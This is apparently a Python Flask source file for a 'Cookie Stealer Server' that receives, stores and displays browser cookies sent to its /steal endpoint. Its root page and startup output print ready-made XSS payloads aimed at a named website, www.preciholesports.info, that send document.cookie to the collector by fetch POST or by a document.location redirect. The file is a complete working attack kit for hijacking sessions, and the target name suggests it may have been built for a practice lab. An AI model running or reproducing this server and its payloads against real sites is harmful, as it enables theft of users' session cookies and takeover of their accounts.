from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Store received cookies for demonstration
received_cookies = []

@app.route('/')
def index():
    """Root route - shows server status and usage instructions"""
    return '''
    <h1>🍪 Cookie Stealer Server</h1>
    <p><strong>Server Status:</strong> 🟢 Running</p>
    <p><strong>Endpoints:</strong></p>
    <ul>
        <li><code>POST /steal</code> - Receive stolen cookies</li>
        <li><code>GET /status</code> - Server health check</li>
        <li><code>GET /cookies</code> - View received cookies</li>
    </ul>
    <h2>📝 XSS Payloads for www.preciholesports.info:</h2>
    <pre><code><script>fetch('http://localhost:5000/steal', {method: 'POST', mode: 'no-cors', body: document.cookie});</script></code></pre>
    <h3>Alternative Payloads:</h3>
    <pre><code><script>document.location='http://localhost:5000/steal?c='+document.cookie;</script></code></pre>
    '''

@app.route('/status')
def status():
    """Health check endpoint"""
    return jsonify({
        'status': 'running',
        'endpoint': '/steal',
        'method': 'POST',
        'received_cookies_count': len(received_cookies)
    })

@app.route('/cookies')
def cookies():
    """View received cookies"""
    return jsonify({
        'cookies': received_cookies,
        'count': len(received_cookies)
    })

@app.route('/steal', methods=['POST', 'GET'])
def steal_cookies():
    """Endpoint to receive stolen cookies"""
    if request.method == 'GET':
        # Handle GET requests (for document.location payloads)
        cookies = request.args.get('c', '')
    else:
        # Handle POST requests (for fetch payloads)
        cookies = request.get_data(as_text=True)
    
    if cookies:
        received_cookies.append({
            'timestamp': str(datetime.now()),
            'cookies': cookies
        })
        print(f"🍪 Received cookies: {cookies}")
    
    return 'Cookies received', 200

@app.errorhandler(404)
def not_found(error):
    """Custom 404 error page"""
    return '''
    <h1>404 - Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <p>Available endpoints:</p>
    <ul>
        <li><code>/</code> - Home & usage</li>
        <li><code>/status</code> - Health check</li>
        <li><code>/steal</code> - Cookie collection (POST)</li>
    </ul>
    ''', 404

if __name__ == '__main__':
    print("=" * 50)
    print("🍪 Cookie Stealer Server Starting...")
    print("=" * 50)
    print("\n📋 XSS Payloads for www.preciholesports.info:")
    print("-" * 50)
    print("Payload 1 (Recommended - POST):")
    print('<script>fetch("http://localhost:5000/steal", {method: "POST", mode: "no-cors", body: document.cookie});</script>')
    print("\nPayload 2 (GET):")
    print('<script>document.location="http://localhost:5000/steal?c="+document.cookie;</script>')
    print("\n" + "-" * 50)
    print("✅ Server running on http://localhost:5000")
    print("✅ Health check: http://localhost:5000/status")
    print("✅ View cookies: http://localhost:5000/cookies")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=True)
